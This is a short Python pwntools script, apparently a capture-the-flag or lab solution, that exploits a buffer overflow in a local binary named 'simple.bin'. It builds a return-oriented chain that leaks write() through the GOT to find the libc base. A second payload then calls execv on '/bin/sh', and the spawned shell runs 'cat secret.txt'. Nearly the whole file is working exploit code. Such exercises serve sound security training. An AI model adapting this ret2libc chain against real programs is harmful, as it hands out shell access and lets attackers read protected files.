#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./simple.bin")

    # Investigate the libc library.
    rop = ROP("./simple.bin")
    #pop rdi ret 0x400673
    #pop rsi r15 ret 0x400671
    #read
    #write
    #execv
    rdi = p64(0x400673)
    rsi = p64(0x400671)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    write_offset = libc.symbols['write']
    read_offset = libc.symbols['read']
    execv_offset = libc.symbols['execv']
    print("Offset of write() within libc library: %s" % hex(write_offset)) #0xf73b0
    print("Offset of read() within libc library: %s" % hex(read_offset)) #0xf7350
    print("Offset of execv() within libc library: %s" % hex(execv_offset)) #0xcc8e0
    #rdi: /bin/sh, #rsi: NULL
    #aaa.. + rdi_gadget + addr of /bin/sh + rsi_gadget + NULL + addr of execv
    #input("start")
    print(p.recvline())
    p.send(b"a" * 0x18 + rdi + p64(0x01) + rsi + p64(0x601018) + p64(0x10) + p64(0x400470) + p64(0x4005b6) + p64(0x00))
    #trash + write(1, &GOT, 10)
    #read(0, buf, 64)
    write_addr = u64(p.recvn(6) + b'\x00' * 0x02)
    #print(write_addr)
    base_addr = write_addr - write_offset
    #print(base_addr)
    execv_addr = base_addr + execv_offset
    #print(execv_addr)
    hex_execv_addr = hex(execv_addr)
    bin_offset = next(libc.search(b"/bin/sh\x00"))
    bin_addr = base_addr + bin_offset
    #print(p64(bin_addr))
    #input("second phase")
    p.send(b"b" * 0x18 + rdi + p64(bin_addr) + rsi + p64(0x00) + p64(0x00) + p64(execv_addr))
    #print("second input done")
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())
if __name__ == "__main__":
    exploit()
